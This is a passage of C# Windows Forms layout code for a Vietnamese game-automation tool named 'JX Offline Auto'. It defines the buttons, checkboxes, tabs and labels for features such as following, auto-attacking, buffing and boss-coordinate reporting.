		this.tabPage12.SuspendLayout();
		this.tabPage8.SuspendLayout();
		this.groupBox3.SuspendLayout();
		this.groupBox2.SuspendLayout();
		this.tabPage10.SuspendLayout();
		this.groupBox10.SuspendLayout();
		this.groupBox9.SuspendLayout();
		this.tabPageTest.SuspendLayout();
		this.pkdon.SuspendLayout();
		this.uutien.SuspendLayout();
		((System.ComponentModel.ISupportInitialize)this.pictureBoxQC).BeginInit();
		base.SuspendLayout();
		this.notifyIcon_0.Text = "JX Offline Auto";
		this.notifyIcon_0.MouseClick += new System.Windows.Forms.MouseEventHandler(notifyIcon_0_MouseClick);
		this.timer_3.Tick += new System.EventHandler(timer_3_Tick);
		this.textBoxKhoangCachAccChinh.ForeColor = System.Drawing.Color.Black;
		this.textBoxKhoangCachAccChinh.Location = new System.Drawing.Point(115, 58);
		this.textBoxKhoangCachAccChinh.Name = "textBoxKhoangCachAccChinh";
		this.textBoxKhoangCachAccChinh.Size = new System.Drawing.Size(35, 20);
		this.textBoxKhoangCachAccChinh.TabIndex = 135;
		this.textBoxKhoangCachAccChinh.TextChanged += new System.EventHandler(textBoxKhoangCachAccChinh_TextChanged);
		this.textBoxKhoangCachAccChinh.Leave += new System.EventHandler(textBoxKhoangCachAccChinh_Leave);
		this.checkBoxTimTrongthanh.BackColor = System.Drawing.SystemColors.Control;
		this.checkBoxTimTrongthanh.Font = new System.Drawing.Font("Microsoft Sans Serif", 9f);
		this.checkBoxTimTrongthanh.ForeColor = System.Drawing.Color.ForestGreen;
		this.checkBoxTimTrongthanh.Location = new System.Drawing.Point(4, 81);
		this.checkBoxTimTrongthanh.Name = "checkBoxTimTrongthanh";
		this.checkBoxTimTrongthanh.Size = new System.Drawing.Size(146, 25);
		this.checkBoxTimTrongthanh.TabIndex = 134;
		this.checkBoxTimTrongthanh.Text = "TÌM TRONG THÀNH";
		this.checkBoxTimTrongthanh.UseVisualStyleBackColor = false;
		this.checkBoxTimTrongthanh.CheckedChanged += new System.EventHandler(checkBoxTimTrongthanh_CheckedChanged);
		this.comboBoxAccChinh.DropDownStyle = System.Windows.Forms.ComboBoxStyle.DropDownList;
		this.comboBoxAccChinh.DropDownWidth = 125;
		this.comboBoxAccChinh.ForeColor = System.Drawing.Color.Black;
		this.comboBoxAccChinh.FormattingEnabled = true;
		this.comboBoxAccChinh.Location = new System.Drawing.Point(153, 3);
		this.comboBoxAccChinh.Name = "comboBoxAccChinh";
		this.comboBoxAccChinh.Size = new System.Drawing.Size(136, 21);
		this.comboBoxAccChinh.TabIndex = 133;
		this.comboBoxAccChinh.SelectedIndexChanged += new System.EventHandler(comboBoxAccChinh_SelectedIndexChanged);
		this.comboBoxAccChinh.MouseDown += new System.Windows.Forms.MouseEventHandler(comboBoxAccChinh_MouseDown);
		this.comboBoxIndex.DropDownStyle = System.Windows.Forms.ComboBoxStyle.DropDownList;
		this.comboBoxIndex.DropDownWidth = 140;
		this.comboBoxIndex.ForeColor = System.Drawing.Color.DarkRed;
		this.comboBoxIndex.FormattingEnabled = true;
		this.comboBoxIndex.Location = new System.Drawing.Point(5, 31);
		this.comboBoxIndex.Name = "comboBoxIndex";
		this.comboBoxIndex.Size = new System.Drawing.Size(145, 21);
		this.comboBoxIndex.TabIndex = 126;
		this.comboBoxIndex.SelectedIndexChanged += new System.EventHandler(comboBoxIndex_SelectedIndexChanged);
		this.checkBoxTimAccchinh.BackColor = System.Drawing.SystemColors.Control;
		this.checkBoxTimAccchinh.Font = new System.Drawing.Font("Microsoft Sans Serif", 9f);
		this.checkBoxTimAccchinh.ForeColor = System.Drawing.Color.Magenta;
		this.checkBoxTimAccchinh.Location = new System.Drawing.Point(5, 57);
		this.checkBoxTimAccchinh.Name = "checkBoxTimAccchinh";
		this.checkBoxTimAccchinh.Size = new System.Drawing.Size(117, 23);
		this.checkBoxTimAccchinh.TabIndex = 128;
		this.checkBoxTimAccchinh.Text = "TÌM ACC CHÍNH";
		this.checkBoxTimAccchinh.UseVisualStyleBackColor = false;
		this.checkBoxTimAccchinh.CheckedChanged += new System.EventHandler(checkBoxTimAccchinh_CheckedChanged);
		this.buttonOff.BackColor = System.Drawing.Color.DarkSeaGreen;
		this.buttonOff.Font = new System.Drawing.Font("Microsoft Sans Serif", 6f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
		this.buttonOff.ForeColor = System.Drawing.Color.Black;
		this.buttonOff.Location = new System.Drawing.Point(400, 83);
		this.buttonOff.Margin = new System.Windows.Forms.Padding(0);
		this.buttonOff.Name = "buttonOff";
		this.buttonOff.Size = new System.Drawing.Size(37, 25);
		this.buttonOff.TabIndex = 132;
		this.buttonOff.Text = "Tài trợ";
		this.buttonOff.UseVisualStyleBackColor = false;
		this.buttonOff.Visible = false;
		this.buttonOff.Click += new System.EventHandler(buttonOff_Click);
		this.buttonAdd.BackColor = System.Drawing.Color.LightSteelBlue;
		this.buttonAdd.Enabled = true;
		this.buttonAdd.Font = new System.Drawing.Font("Microsoft Sans Serif", 12f);
		this.buttonAdd.ForeColor = System.Drawing.Color.Red;
		this.buttonAdd.Location = new System.Drawing.Point(4, 1);
		this.buttonAdd.Margin = new System.Windows.Forms.Padding(0);
		this.buttonAdd.Name = "buttonAdd";
		this.buttonAdd.Size = new System.Drawing.Size(64, 28);
		this.buttonAdd.TabIndex = 130;
		this.buttonAdd.Text = "A";
		this.buttonAdd.UseVisualStyleBackColor = true;
		this.buttonAdd.Click += new System.EventHandler(buttonAdd_Click);
		this.richTextBoxStatus.Cursor = System.Windows.Forms.Cursors.IBeam;
		this.richTextBoxStatus.Location = new System.Drawing.Point(3, 106);
		this.richTextBoxStatus.Name = "richTextBoxStatus";
		this.richTextBoxStatus.Size = new System.Drawing.Size(147, 88);
		this.richTextBoxStatus.TabIndex = 129;
		this.richTextBoxStatus.Text = "Đang kết nối server, xin vui lòng đợi chút xíu...";
		this.richTextBoxStatus.TextChanged += new System.EventHandler(richTextBoxStatus_TextChanged);
		this.listView1.CheckBoxes = true;
		this.listView1.Columns.AddRange(new System.Windows.Forms.ColumnHeader[4] { this.columnHeader_0, this.columnHeader_1, this.columnHeader_2, this.columnHeader_5 });
		this.listView1.FullRowSelect = true;
		this.listView1.GridLines = true;
		this.listView1.HideSelection = false;
		this.listView1.Location = new System.Drawing.Point(153, 30);
		this.listView1.MultiSelect = false;
		this.listView1.Name = "listView1";
		this.listView1.Size = new System.Drawing.Size(244, 183);
		this.listView1.TabIndex = 136;
		this.listView1.UseCompatibleStateImageBehavior = false;
		this.listView1.View = System.Windows.Forms.View.Details;
		this.listView1.ItemCheck += new System.Windows.Forms.ItemCheckEventHandler(listView1_ItemCheck);
		this.listView1.SelectedIndexChanged += new System.EventHandler(listView1_SelectedIndexChanged);
		this.listView1.MouseDoubleClick += new System.Windows.Forms.MouseEventHandler(listView1_MouseDoubleClick);
		this.listView1.MouseDown += new System.Windows.Forms.MouseEventHandler(listView1_MouseDown);
		this.listView1.MouseUp += new System.Windows.Forms.MouseEventHandler(listView1_MouseUp);
		this.columnHeader_0.Text = "Tên nhân vật";
		this.columnHeader_0.Width = 105;
		this.columnHeader_1.Text = "Doing";
		this.columnHeader_1.Width = 42;
		this.columnHeader_2.Text = "Bản đồ";
		this.columnHeader_2.Width = 58;
		this.columnHeader_5.Text = "***";
		this.columnHeader_5.Width = 37;
		this.columnHeader_6.Text = "Ưu tiên đánh";
		this.columnHeader_6.Width = 135;
		this.tabControl1.Controls.Add(this.tabPage1);
		this.tabControl1.Controls.Add(this.tabPage2);
		this.tabControl1.Controls.Add(this.tabPage7);
		this.tabControl1.Controls.Add(this.tabPage9);
		this.tabControl1.Controls.Add(this.pkdon);
		this.tabControl1.Controls.Add(this.uutien);
		this.tabControl1.Dock = System.Windows.Forms.DockStyle.Bottom;
		this.tabControl1.Font = new System.Drawing.Font("Microsoft Sans Serif", 9f);
		this.tabControl1.Location = new System.Drawing.Point(0, 213);
		this.tabControl1.Margin = new System.Windows.Forms.Padding(0);
		this.tabControl1.Name = "tabControl1";
		this.tabControl1.Padding = new System.Drawing.Point(6, 6);
		this.tabControl1.SelectedIndex = 0;
		this.tabControl1.Size = new System.Drawing.Size(399, 324);
		this.tabControl1.TabIndex = 137;
		this.tabPage1.Controls.Add(this.checkBoxDungHieuUng2);
		this.tabPage1.Controls.Add(this.tabControl3);
		this.tabPage1.Location = new System.Drawing.Point(4, 30);
		this.tabPage1.Name = "tabPage1";
		this.tabPage1.Padding = new System.Windows.Forms.Padding(3);
		this.tabPage1.Size = new System.Drawing.Size(391, 290);
		this.tabPage1.TabIndex = 0;
		this.tabPage1.Text = "Điều khiển";
		this.tabPage1.UseVisualStyleBackColor = true;
		this.checkBoxDungHieuUng2.AutoSize = true;
		this.checkBoxDungHieuUng2.BackColor = System.Drawing.Color.YellowGreen;
		this.checkBoxDungHieuUng2.Location = new System.Drawing.Point(628, 24);
		this.checkBoxDungHieuUng2.Name = "checkBoxDungHieuUng2";
		this.checkBoxDungHieuUng2.Size = new System.Drawing.Size(116, 19);
		this.checkBoxDungHieuUng2.TabIndex = 356;
		this.checkBoxDungHieuUng2.Text = "Hiển thị Oẳng     ";
		this.checkBoxDungHieuUng2.UseVisualStyleBackColor = false;
		this.checkBoxDungHieuUng2.CheckedChanged += new System.EventHandler(checkBoxDungHieuUng2_CheckedChanged);
		this.tabControl3.Controls.Add(this.tabPageBang1);
		this.tabControl3.Controls.Add(this.tabPageBang2);
		this.tabControl3.Controls.Add(this.tabPageTongKim);
		this.tabControl3.Controls.Add(this.tabPageCTC);
		this.tabControl3.Controls.Add(this.tabPageTrain);
		this.tabControl3.Location = new System.Drawing.Point(0, 0);
		this.tabControl3.Margin = new System.Windows.Forms.Padding(0);
		this.tabControl3.Name = "tabControl3";
		this.tabControl3.SelectedIndex = 0;
		this.tabControl3.Size = new System.Drawing.Size(398, 291);
		this.tabControl3.TabIndex = 0;
		this.tabPageBang1.Controls.Add(this.checkBoxdamekethop);
		this.tabPageBang1.Controls.Add(this.hienthithongke);
		this.tabPageBang1.Controls.Add(this.buttonTHP);
		this.tabPageBang1.Controls.Add(this.buttonTatcaTDP);
		this.tabPageBang1.Controls.Add(this.buttonDoSat);
		this.tabPageBang1.Controls.Add(this.comboBoxPhuong);
		this.tabPageBang1.Controls.Add(this.buttonBuffLaiTranphai);
		this.tabPageBang1.Controls.Add(this.buttonThongke);
		this.tabPageBang1.Controls.Add(this.buttonVang);
		this.tabPageBang1.Controls.Add(this.buttonSuadoTaicho);
		this.tabPageBang1.Controls.Add(this.buttonMd);
		this.tabPageBang1.Controls.Add(this.buttonMuctieu);
		this.tabPageBang1.Controls.Add(this.comboBoxTHP);
		this.tabPageBang1.Controls.Add(this.buttonThietLapDuongMon);
		this.tabPageBang1.Controls.Add(this.buttonTim);
		this.tabPageBang1.Controls.Add(this.buttonXanh);
		this.tabPageBang1.Controls.Add(this.buttonNgaMybuff);
		this.tabPageBang1.Controls.Add(this.buttonCashBua);
		this.tabPageBang1.Controls.Add(this.buttonDame);
		this.tabPageBang1.Controls.Add(this.buttonPT);
		this.tabPageBang1.Controls.Add(this.buttonBoss);
		this.tabPageBang1.Controls.Add(this.buttonNamIm);
		this.tabPageBang1.Controls.Add(this.buttonBaoBoss);
		this.tabPageBang1.Controls.Add(this.buttonBaoToado);
		this.tabPageBang1.Controls.Add(this.labelLocdo);
		this.tabPageBang1.Controls.Add(this.checkBoxBosBaobos);
		this.tabPageBang1.Controls.Add(this.textBoxPhamvi);
		this.tabPageBang1.Controls.Add(this.checkBoxCungMucTieu);
		this.tabPageBang1.Controls.Add(this.checkBoxTudongPT);
		this.tabPageBang1.Controls.Add(this.checkBoxDuongMonBoom);
		this.tabPageBang1.Controls.Add(this.labelKieudame);
		this.tabPageBang1.Controls.Add(this.comboBoxXuongNgua);
		this.tabPageBang1.Controls.Add(this.buttonTatcaLuuruong);
		this.tabPageBang1.Controls.Add(this.checkBoxDameMacdinh);
		this.tabPageBang1.Controls.Add(this.buttonMorong);
		this.tabPageBang1.Controls.Add(this.textBoxKhoangCachTheoSau);
		this.tabPageBang1.Controls.Add(this.checkBoxTuCastBua);
		this.tabPageBang1.Controls.Add(this.checkBoxTiepCan);
		this.tabPageBang1.Controls.Add(this.checkBoxDanhquai);
		this.tabPageBang1.Controls.Add(this.buttonUuTien);
		this.tabPageBang1.Controls.Add(this.labelTheoSauAll);
		this.tabPageBang1.Controls.Add(this.buttonLoaitruAccBuff);
		this.tabPageBang1.Controls.Add(this.comboBoxNhatdo);
		this.tabPageBang1.Controls.Add(this.checkBoxNhatdo);
		this.tabPageBang1.Controls.Add(this.comboBoxTheoSau);
		this.tabPageBang1.Controls.Add(this.checkBoxChetnamIm);
		this.tabPageBang1.Controls.Add(this.checkBoxTheoSau);
		this.tabPageBang1.Controls.Add(this.textBoxTimerNgamyBuff);
		this.tabPageBang1.Controls.Add(this.textBoxNgamyBuff);
		this.tabPageBang1.Controls.Add(this.checkBoxNgamyBuff);
		this.tabPageBang1.Controls.Add(this.checkBoxTamQuet);
		this.tabPageBang1.Controls.Add(this.textBoxKhoangCachTiepcan);
		this.tabPageBang1.Controls.Add(this.comboBoxUuTien);
		this.tabPageBang1.Controls.Add(this.checkBoxUutienDanhquai);
		this.tabPageBang1.Controls.Add(this.checkBoxTuve);
		this.tabPageBang1.Location = new System.Drawing.Point(4, 24);
		this.tabPageBang1.Name = "tabPageBang1";
		this.tabPageBang1.Padding = new System.Windows.Forms.Padding(3);
		this.tabPageBang1.Size = new System.Drawing.Size(390, 263);
		this.tabPageBang1.TabIndex = 0;
		this.tabPageBang1.Text = "Bảng 1";
		this.tabPageBang1.UseVisualStyleBackColor = true;
		this.checkBoxdamekethop.AutoSize = true;
		this.checkBoxdamekethop.ForeColor = System.Drawing.SystemColors.MenuHighlight;
		this.checkBoxdamekethop.Location = new System.Drawing.Point(203, 52);
		this.checkBoxdamekethop.Name = "checkBoxdamekethop";
		this.checkBoxdamekethop.Size = new System.Drawing.Size(116, 19);
		this.checkBoxdamekethop.TabIndex = 454;
		this.checkBoxdamekethop.Text = "Dame Mặc Định";
		this.checkBoxdamekethop.UseVisualStyleBackColor = true;
		this.checkBoxdamekethop.CheckedChanged += new System.EventHandler(checkBoxdamekethop_CheckedChanged);
		this.hienthithongke.AutoSize = true;
		this.hienthithongke.Font = new System.Drawing.Font("Microsoft Sans Serif", 8f);
		this.hienthithongke.Location = new System.Drawing.Point(57, 179);
		this.hienthithongke.Name = "hienthithongke";
		this.hienthithongke.Size = new System.Drawing.Size(85, 17);
		this.hienthithongke.TabIndex = 453;
		this.hienthithongke.Text = "Tự Động TK";
		this.hienthithongke.UseVisualStyleBackColor = true;
		this.hienthithongke.CheckedChanged += new System.EventHandler(hienthithongke_CheckedChanged);
		this.buttonTHP.BackColor = System.Drawing.Color.LightSteelBlue;
		this.buttonTHP.ForeColor = System.Drawing.Color.Red;
		this.buttonTHP.Location = new System.Drawing.Point(322, 212);
		this.buttonTHP.Name = "buttonTHP";
		this.buttonTHP.Size = new System.Drawing.Size(65, 47);
		this.buttonTHP.TabIndex = 350;
		this.buttonTHP.Text = "THP";
		this.buttonTHP.UseVisualStyleBackColor = false;
		this.buttonTHP.Click += new System.EventHandler(buttonTHP_Click);
		this.buttonTatcaTDP.BackColor = System.Drawing.Color.White;
		this.buttonTatcaTDP.BackgroundImageLayout = System.Windows.Forms.ImageLayout.None;
		this.buttonTatcaTDP.ForeColor = System.Drawing.Color.Black;
		this.buttonTatcaTDP.Location = new System.Drawing.Point(323, 184);
		this.buttonTatcaTDP.Name = "buttonTatcaTDP";
		this.buttonTatcaTDP.Size = new System.Drawing.Size(65, 26);
		this.buttonTatcaTDP.TabIndex = 191;
		this.buttonTatcaTDP.Text = "TĐP all";
		this.buttonTatcaTDP.UseVisualStyleBackColor = false;
		this.buttonTatcaTDP.Click += new System.EventHandler(buttonTatcaTDP_Click);
		this.buttonDoSat.BackColor = System.Drawing.SystemColors.Control;
		this.buttonDoSat.BackgroundImageLayout = System.Windows.Forms.ImageLayout.None;
		this.buttonDoSat.ForeColor = System.Drawing.Color.Fuchsia;
		this.buttonDoSat.Location = new System.Drawing.Point(238, 183);
		this.buttonDoSat.Name = "buttonDoSat";
		this.buttonDoSat.Size = new System.Drawing.Size(82, 26);
		this.buttonDoSat.TabIndex = 341;
		this.buttonDoSat.Text = "F9 all";
		this.buttonDoSat.UseVisualStyleBackColor = false;
		this.buttonDoSat.Click += new System.EventHandler(buttonDoSat_Click);
		this.comboBoxPhuong.DropDownStyle = System.Windows.Forms.ComboBoxStyle.DropDownList;
		this.comboBoxPhuong.DropDownWidth = 40;
		this.comboBoxPhuong.ForeColor = System.Drawing.Color.Black;
		this.comboBoxPhuong.FormattingEnabled = true;
		this.comboBoxPhuong.Location = new System.Drawing.Point(240, 236);
		this.comboBoxPhuong.Margin = new System.Windows.Forms.Padding(0);
		this.comboBoxPhuong.Name = "comboBoxPhuong";
		this.comboBoxPhuong.Size = new System.Drawing.Size(79, 23);
		this.comboBoxPhuong.TabIndex = 349;
		this.buttonBuffLaiTranphai.BackColor = System.Drawing.SystemColors.Window;
		this.buttonBuffLaiTranphai.BackgroundImageLayout = System.Windows.Forms.ImageLayout.None;
		this.buttonBuffLaiTranphai.ForeColor = System.Drawing.Color.Black;
		this.buttonBuffLaiTranphai.Location = new System.Drawing.Point(323, 156);
		this.buttonBuffLaiTranphai.Name = "buttonBuffLaiTranphai";
		this.buttonBuffLaiTranphai.Size = new System.Drawing.Size(65, 26);
		this.buttonBuffLaiTranphai.TabIndex = 345;
		this.buttonBuffLaiTranphai.Text = "Buf HT";
		this.buttonBuffLaiTranphai.UseVisualStyleBackColor = false;
		this.buttonBuffLaiTranphai.Click += new System.EventHandler(buttonBuffLaiTranphai_Click);
		this.buttonThongke.BackColor = System.Drawing.SystemColors.Control;
		this.buttonThongke.BackgroundImageLayout = System.Windows.Forms.ImageLayout.None;
		this.buttonThongke.Font = new System.Drawing.Font("Microsoft Sans Serif", 8f);
		this.buttonThongke.ForeColor = System.Drawing.Color.Black;
		this.buttonThongke.Location = new System.Drawing.Point(52, 197);
		this.buttonThongke.Name = "buttonThongke";
		this.buttonThongke.Size = new System.Drawing.Size(97, 21);
		this.buttonThongke.TabIndex = 196;
		this.buttonThongke.Text = "Thống kê acc";
		this.buttonThongke.UseVisualStyleBackColor = false;
		this.buttonThongke.Click += new System.EventHandler(buttonThongke_Click);
		this.buttonVang.BackColor = System.Drawing.Color.Gold;
		this.buttonVang.ForeColor = System.Drawing.Color.Black;
		this.buttonVang.Location = new System.Drawing.Point(99, 220);
		this.buttonVang.Name = "buttonVang";
		this.buttonVang.Size = new System.Drawing.Size(48, 39);
		this.buttonVang.TabIndex = 178;
		this.buttonVang.Text = "V";
		this.buttonVang.UseVisualStyleBackColor = false;
		this.buttonVang.Click += new System.EventHandler(buttonVang_Click);
		this.buttonSuadoTaicho.BackColor = System.Drawing.SystemColors.Control;
		this.buttonSuadoTaicho.BackgroundImageLayout = System.Windows.Forms.ImageLayout.None;
		this.buttonSuadoTaicho.Font = new System.Drawing.Font("Microsoft Sans Serif", 8f);
		this.buttonSuadoTaicho.ForeColor = System.Drawing.Color.Black;
		this.buttonSuadoTaicho.Location = new System.Drawing.Point(1, 179);
		this.buttonSuadoTaicho.Name = "buttonSuadoTaicho";
		this.buttonSuadoTaicho.Size = new System.Drawing.Size(50, 39);
		this.buttonSuadoTaicho.TabIndex = 194;
		this.buttonSuadoTaicho.Text = "Sửa đồ";
		this.buttonSuadoTaicho.UseVisualStyleBackColor = false;
		this.buttonSuadoTaicho.Click += new System.EventHandler(buttonSuadoTaicho_Click);
		this.buttonMd.BackColor = System.Drawing.SystemColors.Control;
		this.buttonMd.Font = new System.Drawing.Font("Microsoft Sans Serif", 8f);
		this.buttonMd.ForeColor = System.Drawing.Color.Black;
		this.buttonMd.Location = new System.Drawing.Point(258, 3);
		this.buttonMd.Name = "buttonMd";
		this.buttonMd.Size = new System.Drawing.Size(33, 21);
		this.buttonMd.TabIndex = 452;
		this.buttonMd.Text = ">>";
		this.buttonMd.UseVisualStyleBackColor = false;
		this.buttonMd.Click += new System.EventHandler(buttonMd_Click);
		this.buttonMuctieu.BackColor = System.Drawing.SystemColors.Control;
		this.buttonMuctieu.Font = new System.Drawing.Font("Microsoft Sans Serif", 8.25f);
		this.buttonMuctieu.ForeColor = System.Drawing.Color.Black;
		this.buttonMuctieu.Location = new System.Drawing.Point(136, 55);
		this.buttonMuctieu.Name = "buttonMuctieu";
		this.buttonMuctieu.Size = new System.Drawing.Size(60, 21);
		this.buttonMuctieu.TabIndex = 334;
		this.buttonMuctieu.Text = "Mục tiêu";
		this.buttonMuctieu.UseVisualStyleBackColor = false;
		this.buttonMuctieu.Click += new System.EventHandler(buttonMuctieu_Click);
		this.comboBoxTHP.DropDownStyle = System.Windows.Forms.ComboBoxStyle.DropDownList;
		this.comboBoxTHP.DropDownWidth = 130;
		this.comboBoxTHP.ForeColor = System.Drawing.Color.Black;
		this.comboBoxTHP.FormattingEnabled = true;
		this.comboBoxTHP.Location = new System.Drawing.Point(240, 210);
		this.comboBoxTHP.Name = "comboBoxTHP";
		this.comboBoxTHP.Size = new System.Drawing.Size(79, 23);
		this.comboBoxTHP.TabIndex = 348;
		this.comboBoxTHP.SelectedIndexChanged += new System.EventHandler(comboBoxTHP_SelectedIndexChanged);
		this.buttonThietLapDuongMon.BackColor = System.Drawing.SystemColors.Control;
		this.buttonThietLapDuongMon.ForeColor = System.Drawing.Color.Black;
		this.buttonThietLapDuongMon.Location = new System.Drawing.Point(323, 103);
		this.buttonThietLapDuongMon.Name = "buttonThietLapDuongMon";
		this.buttonThietLapDuongMon.Size = new System.Drawing.Size(64, 21);
		this.buttonThietLapDuongMon.TabIndex = 328;
		this.buttonThietLapDuongMon.Text = "Thiết lập";
		this.buttonThietLapDuongMon.UseVisualStyleBackColor = false;
		this.buttonThietLapDuongMon.Click += new System.EventHandler(buttonThietLapDuongMon_Click);
		this.buttonTim.BackColor = System.Drawing.Color.MediumPurple;
		this.buttonTim.ForeColor = System.Drawing.Color.Black;
		this.buttonTim.Location = new System.Drawing.Point(191, 220);
		this.buttonTim.Name = "buttonTim";
		this.buttonTim.Size = new System.Drawing.Size(48, 39);
		this.buttonTim.TabIndex = 176;
		this.buttonTim.Text = "T";
		this.buttonTim.UseVisualStyleBackColor = false;
		this.buttonTim.Click += new System.EventHandler(buttonTim_Click);
		this.buttonXanh.BackColor = System.Drawing.Color.Chartreuse;
		this.buttonXanh.ForeColor = System.Drawing.Color.Black;
		this.buttonXanh.Location = new System.Drawing.Point(145, 220);
		this.buttonXanh.Name = "buttonXanh";
		this.buttonXanh.Size = new System.Drawing.Size(48, 39);
		this.buttonXanh.TabIndex = 177;
		this.buttonXanh.Text = "X";
		this.buttonXanh.UseVisualStyleBackColor = false;
		this.buttonXanh.Click += new System.EventHandler(buttonXanh_Click);
		this.buttonNgaMybuff.ForeColor = System.Drawing.Color.Black;
		this.buttonNgaMybuff.Location = new System.Drawing.Point(323, 129);
		this.buttonNgaMybuff.Name = "buttonNgaMybuff";
		this.buttonNgaMybuff.Size = new System.Drawing.Size(64, 21);
		this.buttonNgaMybuff.TabIndex = 168;
		this.buttonNgaMybuff.Text = "Kiểu buff";
		this.buttonNgaMybuff.TextAlign = System.Drawing.ContentAlignment.TopCenter;
		this.buttonNgaMybuff.UseVisualStyleBackColor = true;
		this.buttonNgaMybuff.Click += new System.EventHandler(buttonNgaMybuff_Click);
		this.buttonCashBua.Font = new System.Drawing.Font("Microsoft Sans Serif", 8.25f);
		this.buttonCashBua.ForeColor = System.Drawing.Color.Black;
		this.buttonCashBua.Location = new System.Drawing.Point(89, 104);
		this.buttonCashBua.Name = "buttonCashBua";
		this.buttonCashBua.Size = new System.Drawing.Size(60, 21);
		this.buttonCashBua.TabIndex = 171;
		this.buttonCashBua.Text = "Loại bùa";
		this.buttonCashBua.UseVisualStyleBackColor = true;
		this.buttonCashBua.Click += new System.EventHandler(buttonCashBua_Click);
		this.buttonDame.BackColor = System.Drawing.SystemColors.Control;
		this.buttonDame.ForeColor = System.Drawing.Color.Blue;
		this.buttonDame.Location = new System.Drawing.Point(323, 56);
		this.buttonDame.Name = "buttonDame";
		this.buttonDame.Size = new System.Drawing.Size(64, 21);
		this.buttonDame.TabIndex = 324;
		this.buttonDame.Text = "Thiết lập";
		this.buttonDame.UseVisualStyleBackColor = false;
		this.buttonDame.Click += new System.EventHandler(buttonDame_Click);
		this.buttonPT.BackColor = System.Drawing.SystemColors.Control;
		this.buttonPT.ForeColor = System.Drawing.Color.Black;
		this.buttonPT.Location = new System.Drawing.Point(223, 104);
		this.buttonPT.Name = "buttonPT";
		this.buttonPT.Size = new System.Drawing.Size(25, 20);
		this.buttonPT.TabIndex = 451;
		this.buttonPT.Text = "...";
		this.buttonPT.UseVisualStyleBackColor = false;
		this.buttonPT.Click += new System.EventHandler(buttonPT_Click);
		this.buttonBoss.BackColor = System.Drawing.SystemColors.Control;
		this.buttonBoss.ForeColor = System.Drawing.Color.Black;
		this.buttonBoss.Location = new System.Drawing.Point(170, 79);
		this.buttonBoss.Name = "buttonBoss";
		this.buttonBoss.Size = new System.Drawing.Size(25, 21);
		this.buttonBoss.TabIndex = 450;
		this.buttonBoss.Text = "...";
		this.buttonBoss.UseVisualStyleBackColor = false;
		this.buttonBoss.Click += new System.EventHandler(buttonBoss_Click);
		this.buttonNamIm.BackColor = System.Drawing.SystemColors.Control;
		this.buttonNamIm.Font = new System.Drawing.Font("Microsoft Sans Serif", 8.25f);
		this.buttonNamIm.ForeColor = System.Drawing.Color.Black;
		this.buttonNamIm.Location = new System.Drawing.Point(362, 3);
		this.buttonNamIm.Name = "buttonNamIm";
		this.buttonNamIm.Size = new System.Drawing.Size(25, 21);
		this.buttonNamIm.TabIndex = 449;
		this.buttonNamIm.Text = "im";
		this.buttonNamIm.UseVisualStyleBackColor = false;
		this.buttonNamIm.Click += new System.EventHandler(buttonNamIm_Click);
		this.buttonBaoBoss.BackColor = System.Drawing.SystemColors.Control;
		this.buttonBaoBoss.Font = new System.Drawing.Font("Microsoft Sans Serif", 8f);
		this.buttonBaoBoss.ForeColor = System.Drawing.Color.Black;
		this.buttonBaoBoss.Location = new System.Drawing.Point(323, 80);
		this.buttonBaoBoss.Name = "buttonBaoBoss";
		this.buttonBaoBoss.Size = new System.Drawing.Size(64, 20);
		this.buttonBaoBoss.TabIndex = 448;
		this.buttonBaoBoss.Text = "Kênh";
		this.buttonBaoBoss.UseVisualStyleBackColor = false;
		this.buttonBaoBoss.Click += new System.EventHandler(buttonBaoBoss_Click);
		this.buttonBaoToado.BackColor = System.Drawing.SystemColors.Control;
		this.buttonBaoToado.BackgroundImageLayout = System.Windows.Forms.ImageLayout.None;
		this.buttonBaoToado.ForeColor = System.Drawing.Color.Black;
		this.buttonBaoToado.Location = new System.Drawing.Point(151, 179);
		this.buttonBaoToado.Name = "buttonBaoToado";
		this.buttonBaoToado.Size = new System.Drawing.Size(84, 39);
		this.buttonBaoToado.TabIndex = 197;
		this.buttonBaoToado.Text = "Báo tọa độ";
		this.buttonBaoToado.UseVisualStyleBackColor = false;
		this.buttonBaoToado.Click += new System.EventHandler(buttonBaoToado_Click);
		this.labelLocdo.BackColor = System.Drawing.SystemColors.Control;
		this.labelLocdo.BorderStyle = System.Windows.Forms.BorderStyle.Fixed3D;
		this.labelLocdo.Cursor = System.Windows.Forms.Cursors.Hand;
		this.labelLocdo.ForeColor = System.Drawing.Color.DarkBlue;
		this.labelLocdo.Location = new System.Drawing.Point(220, 159);
		this.labelLocdo.Name = "labelLocdo";
		this.labelLocdo.Size = new System.Drawing.Size(30, 19);
		this.labelLocdo.TabIndex = 337;
		this.labelLocdo.Text = "lọc";
		this.labelLocdo.TextAlign = System.Drawing.ContentAlignment.MiddleCenter;
		this.labelLocdo.Click += new System.EventHandler(labelLocdo_Click);
		this.checkBoxBosBaobos.AutoSize = true;
		this.checkBoxBosBaobos.ForeColor = System.Drawing.Color.Black;
		this.checkBoxBosBaobos.Location = new System.Drawing.Point(203, 85);
		this.checkBoxBosBaobos.Name = "checkBoxBosBaobos";
		this.checkBoxBosBaobos.Size = new System.Drawing.Size(114, 19);
		this.checkBoxBosBaobos.TabIndex = 447;
		this.checkBoxBosBaobos.Text = "Báo tọa độ boss";
		this.checkBoxBosBaobos.UseVisualStyleBackColor = true;
		this.checkBoxBosBaobos.CheckedChanged += new System.EventHandler(checkBoxBosBaobos_CheckedChanged);
		this.textBoxPhamvi.ForeColor = System.Drawing.Color.Black;
		this.textBoxPhamvi.Location = new System.Drawing.Point(112, 3);
		this.textBoxPhamvi.Name = "textBoxPhamvi";
		this.textBoxPhamvi.Size = new System.Drawing.Size(30, 21);
		this.textBoxPhamvi.TabIndex = 158;
		this.textBoxPhamvi.TextChanged += new System.EventHandler(textBoxPhamvi_TextChanged);
		this.checkBoxCungMucTieu.BackColor = System.Drawing.SystemColors.Control;
		this.checkBoxCungMucTieu.Font = new System.Drawing.Font("Microsoft Sans Serif", 8.25f);
		this.checkBoxCungMucTieu.ForeColor = System.Drawing.Color.Red;
		this.checkBoxCungMucTieu.Location = new System.Drawing.Point(3, 57);
		this.checkBoxCungMucTieu.Name = "checkBoxCungMucTieu";
		this.checkBoxCungMucTieu.Size = new System.Drawing.Size(131, 17);
		this.checkBoxCungMucTieu.TabIndex = 333;
		this.checkBoxCungMucTieu.Text = "Đánh cùng mục tiêu";
		this.checkBoxCungMucTieu.UseVisualStyleBackColor = false;
		this.checkBoxCungMucTieu.CheckedChanged += new System.EventHandler(checkBoxCungMucTieu_CheckedChanged);
